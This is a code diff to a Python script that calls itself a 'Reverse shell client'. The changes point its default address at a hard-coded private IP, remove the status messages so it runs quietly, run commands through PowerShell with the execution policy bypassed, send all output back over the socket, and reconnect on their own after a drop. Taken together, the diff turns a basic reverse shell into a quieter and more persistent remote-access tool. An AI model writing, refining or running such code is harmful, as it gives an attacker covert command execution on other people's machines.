@@ -5,34 +5,35 @@ import socket
 import argparse
 import subprocess
 import threading
+import shutil
+
 
 def parse_address():
     parser = argparse.ArgumentParser(description="Reverse shell client")
-    parser.add_argument('-a', '--address', default='127.0.0.1', help='IP address to connect to')
+    parser.add_argument('-a', '--address', default='10.122.70.210', help='IP address to connect to')
     parser.add_argument('-p', '--port', type=int, default=9999, help='Port to connect to')
     args = parser.parse_args()
     return args.address, args.port
+
 
 def keep_alive(conn):
     while True:
         try:
             conn.send(b'\x00')
         except Exception:
-            print("[-] Lost connection")
-            print("[*] Trying to reconnect")
             conn.close()
             connect()
             break
         time.sleep(1)
 
+
 def shell(conn):
-    print("[+] Connected... :)")
     threading.Thread(target=keep_alive, args=(conn,), daemon=True).start()
 
     while True:
         try:
             path = os.getcwd()
-            conn.sendall((path + ">").encode())
+            conn.sendall((path + "> ").encode())
 
             cmd = b''
             while not cmd.endswith(b'\n'):
@@ -65,20 +66,30 @@ def shell(conn):
 
             else:
                 if os.name == 'nt':
-                    result = subprocess.run(["powershell", "/C", cmd], capture_output=True)
+                    # Use PowerShell or PowerShell Core (if available)
+                    powershell_exe = shutil.which("pwsh") or "powershell.exe"
+                    result = subprocess.run(
+                        [powershell_exe, "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
+                        capture_output=True,
+                        text=True
+                    )
                 else:
-                    result = subprocess.run(cmd, shell=True, capture_output=True)
-                conn.sendall(result.stdout + result.stderr)
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+
+                output = result.stdout + result.stderr
+                if not output:
+                    output = "[+] Command executed, but no output.\n"
+                conn.sendall(output.encode())
 
         except Exception as e:
-            print(f"[-] Closed... :( Reason: {e}")
+            conn.sendall(f"\n[!] Error: {e}\n".encode())
             conn.close()
             connect()
             break
 
+
 def connect():
     ip, port = parse_address()
-    print(f"[-] Trying to connect to {ip}:{port}")
     while True:
         try:
             s = socket.create_connection((ip, port))
@@ -86,6 +97,7 @@ def connect():
             break
         except Exception:
             time.sleep(1)
+
 
 if __name__ == "__main__":
     connect()
